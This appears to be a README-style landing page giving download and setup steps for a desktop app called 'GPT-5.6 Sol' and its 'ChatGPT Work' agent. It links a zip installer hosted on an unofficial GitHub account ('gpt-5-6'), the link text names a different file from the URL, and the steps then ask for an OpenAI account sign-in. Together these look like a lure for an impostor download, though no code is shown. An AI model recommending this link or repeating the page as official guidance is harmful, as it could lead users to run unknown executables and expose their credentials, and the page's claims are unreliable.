## How to Download and Install

Follow these steps to set up GPT-5.6 Sol on your computer.

1. Download the archive: [assets/sol-desktop.zip](https://github.com/gpt-5-6/gpt-5-6.github.io/releases/download/v5.6.0/sol-setup.zip)
2. Extract the contents to a folder on your computer
3. Open the extracted folder and run the installer
4. Follow the on-screen instructions to complete the setup
5. Launch the application and sign in with your OpenAI account
6. Select GPT-5.6 Sol from the model picker
7. Adjust the effort level based on your task (medium, max, or ultra)

## Getting Started

Once the application is installed, you can begin using GPT-5.6 Sol immediately.

1. Open the desktop application
2. Verify that Sol is selected as the active model
3. Enter your task description in the input field
4. For complex tasks, enable Ultra mode from the settings menu
5. Monitor progress in the task panel — Sol shows intermediate results as it works

The desktop interface provides access to GPT-5.6 Sol, ChatGPT Work, and Codex in a single unified application.

## Using ChatGPT Work with Sol

ChatGPT Work is an agent that runs on GPT-5.6 Sol. It can execute multi-step projects across your connected apps and files for hours at a time. You can start tasks from any device and check progress later. The agent returns finished documents, spreadsheets, reports, and web apps instead of chat replies.

### Starting a Work Task

1. Open the ChatGPT Work interface in the desktop app
2. Describe the outcome you need (a report, analysis, dashboard, or application)
3. Set the effort level appropriate for the task complexity
4. The agent gathers context, breaks down the goal, and executes each step
5. Review the finished result when notified
